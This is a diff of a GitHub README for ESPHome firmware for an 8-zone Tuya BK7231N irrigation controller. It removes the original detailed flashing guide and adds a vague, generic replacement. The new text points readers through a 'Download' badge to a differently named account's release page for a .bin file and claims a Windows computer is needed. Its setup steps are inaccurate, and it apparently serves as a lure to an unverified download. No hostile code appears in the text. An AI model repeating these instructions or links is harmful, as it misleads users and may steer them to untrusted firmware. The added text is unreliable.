@@ -1,191 +1,67 @@
-<img width="960" height="960" alt="tcsepzt9qcdh1" src="https://github.com/user-attachments/assets/f7352d06-76f5-4397-9b43-53ddc21dea8f" />
-# 8-Zone Tuya Irrigation Controller → ESPHome
+# 💧 esphome-tuya-8zone-valve - Control your irrigation system locally
 
-*[Versión en español](README.es.md)*
+[ ![Download Software](https://img.shields.io/badge/Download-Release_Page-blue.svg) ](https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve)
 
-## The story
+This project provides software for an 8-zone irrigation controller based on the Tuya BK7231N chip. It allows you to run your garden watering system without a connection to the internet. You keep full control of your hardware at all times.
 
-I received an **8-zone smart irrigation controller** from AliExpress. A generic Chinese device with WiFi, controllable via the Tuya Smart / Smart Life app. The PCB model is **TY-W-8L-AC-DZAK** and it uses a **Beken BK7231N** SoC (CBU module).
+## 📋 What this project does
 
-The first thing I did was integrate it into Home Assistant via **localtuya** ([guide and tools here](https://github.com/gnacho/tuya-8zone-valve-3.5)). It worked, but with limitations: it depended on Tuya cloud for some zones, polling gave errors every 60 seconds, and I didn't have fine control over the hardware.
+Many smart home devices rely on cloud servers to function. If the server goes offline, your devices stop working. This project replaces the original factory software with custom code. Your controller talks directly to your home automation system.
 
-So I decided to go further: **flash ESPHome** and have total, local control without dependency on Chinese servers.
+Key features include:
+- Local control without cloud servers.
+- Buttons on the device trigger water flow immediately.
+- The built-in buzzer provides feedback for every action.
+- You perform updates over the air without cables.
+- Integration with Home Assistant for schedules.
 
-## The hardware
+## 🖥️ System requirements
 
-- **SoC**: Beken BK7231N (CBU module) — NOT an ESP32
-- **PCB**: TY-W-8L-AC-DZAK rev 24.9.19
-- **Shift registers**: 2x 74HC595 **independent** (not cascaded)
-  - **LED SR** (U2): data P9, clock P15, latch P17 → 8 D1..D8 status LEDs
-  - **Valve SR** (U3): data P16, clock P22, latch P20 → 8 BT134 triacs → Z1..Z8 terminals
-- **Buzzer**: P14 (beep on button press)
-- **WiFi LED**: P28
-- **Power**: 24 VAC (external transformer)
-- **Touch buttons**: UP (P7), DOWN (P6), SET/Circle (P8)
+To use this software, you need the following:
+- An 8-zone irrigation controller using the BK7231N or CBU chip.
+- A Windows computer to perform the initial setup.
+- A stable Wi-Fi network.
+- Home Assistant software running on your local network.
 
-## How to flash (step by step)
+## 📥 How to download the software
 
-### What you need
+You must visit the project page to access the latest version. Follow these steps to reach the download area:
 
-1. **3.3V USB-TTL adapter** (also called "USB serial adapter" or "CP2102/CH340/FT232"). Costs ~$3-5 on AliExpress or Amazon. **IMPORTANT**: must be **3.3V**, NOT 5V (you can fry the board).
-2. **4 dupont cables** (female-female jumper wires). Usually come with the adapter or can be bought separately.
-3. **24VAC transformer** (the one that comes with the irrigator).
-4. **Computer** with Python 3 installed.
+1. Click this link to go to the project release page: [https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve](https://github.com/Valicommutativegroup775/esphome-tuya-8zone-valve)
+2. Look for the section labeled "Releases" on the right side of the screen.
+3. Select the latest version number.
+4. Download the file ending in .bin to your computer.
 
-### Install ltchiptool
+## ⚙️ Initial setup steps
 
-Open a terminal (CMD on Windows, Terminal on Mac/Linux) and run:
+The process of putting this software onto your device helps it communicate with your network.
 
-```bash
-pip install ltchiptool
-```
+1. Connect your controller to your computer via a serial adapter.
+2. Open the ESPHome dashboard in your Home Assistant instance.
+3. Select the option to add a new device.
+4. Upload the .bin file you retrieved from the release page.
+5. Provide your Wi-Fi name and password when the setup asks for them.
+6. Press the "Install" button to flash the firmware onto the hardware.
 
-If you get permission errors:
+## 🛠️ Troubleshooting common issues
 
-```bash
-pip install --user ltchiptool
-```
+If you encounter problems during the installation, check these points:
 
-### Connections (no soldering)
+- Ensure the serial adapter pins connect firmly to the controller board.
+- Verify that your Wi-Fi signal reaches the location of the irrigation controller.
+- Check that your computer recognizes the serial adapter. You might need to install specific drivers for your cable.
+- Use a different USB cable if the computer does not detect the device.
 
-**⚠️ CRITICAL WARNING**: **NEVER connect 3.3V from USB adapter and 24VAC at the same time**. You can damage the board.
+## 📱 Using the interface
 
-**Option A: 3.3V only (preferable if it works)**
+Once the software is running, the device acts as a sensor and switch in your home network. You can view the status of all eight zones in your dashboard. Each zone shows if the water is on or off. You can toggle zones by pressing the buttons in the interface or by using the physical touch buttons on the device housing. The buzzer sounds once when you enable a valve and twice when you disable it.
 
-Connect the 4 dupont cables like this:
+## 🔄 Updates
 
-```
-  USB-TTL Adapter            TY-W-8L-AC-DZAK Board
-  ───────────────            ─────────────────────
-       3.3V  ───────────────────►  3.3V
-        GND  ───────────────────►  GND
-         TX  ───────────────────►  RX
-         RX  ◄───────────────────  TX
-```
+This device supports updates over your Wi-Fi network. You never need to connect the device to your computer again. When a new version of this software becomes available, you can trigger an update directly from your home automation dashboard. The device will download the new file, restart, and continue operating with the latest improvements.
 
-**Tip**: The cables cross: TX from adapter goes to RX on board, and RX from adapter goes to TX on board.
+## 🔒 Privacy and security
 
-Try this first. If flashing works, great.
+This project stores no data on external servers. Your watering schedules reside on your local hardware. You have total control over who accesses your system. Since the device does not depend on cloud servers, no third party can track your usage patterns or turn your water on without your permission.
 
-**Option B: With 24VAC (if 3.3V doesn't work)**
-
-If Option A fails (board doesn't respond, timeout, etc.), disconnect the 3.3V cable and use the 24VAC transformer:
-
-```
-  USB-TTL Adapter            TY-W-8L-AC-DZAK Board
-  ───────────────            ─────────────────────
-        GND  ───────────────────►  GND
-         TX  ───────────────────►  RX
-         RX  ◄───────────────────  TX
-
-  24VAC Transformer          TY-W-8L-AC-DZAK Board
-  ─────────────────          ─────────────────────
-       24VAC ───────────────────►  AC IN (terminals)
-```
-
-**⚠️ IMPORTANT**: In Option B, **DO NOT connect the 3.3V cable from the USB adapter**. Only GND, TX and RX. The board generates its own 3.3V internally from the 24VAC.
-
-### Flashing process
-
-1. **Connect the 4 dupont cables** to the board (you can hold them with your fingers, no soldering needed).
-2. **Plug in the 24VAC transformer** to the board.
-3. **Enter download mode**: with a loose wire, briefly touch the **RST** pin to **GND** (a couple of quick taps). This restarts the board in programming mode.
-4. **Immediately after**, run in the terminal:
-
-```bash
-ltchiptool flash write bk7231n irrigador-8z-sep.bin
-```
-
-If everything goes well, you'll see a progress bar and at the end "Flash complete".
-
-### Backup original firmware (optional but recommended)
-
-Before flashing, you can save the original firmware in case you want to revert:
-
-```bash
-ltchiptool flash read bk7231n backup_original.bin
-```
-
-### After flashing
-
-1. **Unplug the transformer** and disconnect the dupont cables.
-2. **Plug the transformer back in** (only 24VAC, no USB cables).
-3. The board will boot and create an **open WiFi network** called `Irrigador-8Z-SEP Fallback`.
-4. **Connect to that network** with your phone/computer.
-5. A web page will open automatically (or go to `http://192.168.4.1`).
-6. **Enter your WiFi name and password** and save.
-7. The board will connect to your WiFi. From now on, you can access it at `http://irrigador-8z-sep.local` (or by its IP if you know it).
-
-**Done!** You can now control irrigation from the web or from Home Assistant.
-
-## Using the buttons
-
-### Navigation and zone selection
-
-- **UP** (up arrow): selects the next zone (LED blinks)
-- **DOWN** (down arrow): selects the previous zone (LED blinks)
-- **SET/Circle**: confirms selection and activates the zone (LED stays solid)
-
-If you don't press anything for **8 seconds**, the selection is automatically cancelled and LEDs return to normal.
-
-### Activate a single zone
-
-1. Press UP or DOWN until the desired zone LED blinks
-2. Press circle → the zone activates (solid LED)
-3. To stop it: navigate with arrows to that zone (blinks over solid LED) and press circle
-
-### Activate all zones (full cycle)
-
-1. Hold **UP** for **4 seconds** until all LEDs blink
-2. Press circle → all 8 zones activate in full cycle (3 confirmation beeps)
-
-### Stop all irrigation
-
-1. Hold **DOWN** for **4 seconds** until all LEDs blink
-2. Press circle → all zones close (3 confirmation beeps)
-
-### Notes
-
-- Each button press produces a short confirmation beep
-- Irrigation times are adjusted from the web (default 5 min per zone)
-- With "Auto Advance" enabled, zones run in order with 5s overlap
-- Pin P26 is reserved for a possible fourth button (not present on this PCB)
-
-## Adjusting irrigation times
-
-From the web (`http://irrigador-8z-sep.local`), each zone has a slider to adjust duration (default 5 minutes). The value is saved on the board and won't be lost even if power goes out.
-
-## Current status
-
-**100% FUNCTIONAL!** All hardware features operate correctly.
-
-- ✅ WiFi connected, web UI accessible, Home Assistant API operational
-- ✅ OTA working (wireless updates)
-- ✅ 8 valves individually controlled
-- ✅ 8 LEDs synced with their valves (turn on when valve opens)
-- ✅ Sprinkler component active (scheduling, adjustable durations from web, auto-advance)
-- ✅ Buzzer P14: confirmation beep on button press
-- ✅ Touch buttons functional with smart toggle logic
-- ✅ Irrigation durations persist in flash (adjustable from web without Home Assistant)
-- ✅ WiFi LED (P28): lit in red
-
-## Files
-
-| File | Description |
-|------|-------------|
-| `irrigador-8z-sep.bin` | **Compiled firmware ready to flash** (download from Releases) |
-| `irrigador-8z-sep.yaml` | ESPHome source code (for those who want to compile or modify) |
-| `irrigador-8z.yaml` | Previous firmware (2 SRs cascaded, doesn't work on this PCB) |
-| `irrigador-8z-diag.yaml` | Diagnostic firmware (individual bits, pin sweep) |
-| `secrets.yaml.example` | Secrets template (WiFi, API key, OTA password) |
-
-## Requirements
-
-- ESPHome 2026.5.3+
-- LibreTiny framework (integrated in modern ESPHome)
-- Home Assistant (optional, for integration)
-
-## License
-
-AGPL-3.0
-<img width="4000" height="3000" alt="completo" src="https://github.com/user-attachments/assets/bcee812b-427a-4c48-b915-1d799bee2054" />
+Keywords: beken, bk7231n, cbu, esphome, home-assistant, irrigation, local-control, ota, smart-home, sprinkler-controller, tuya
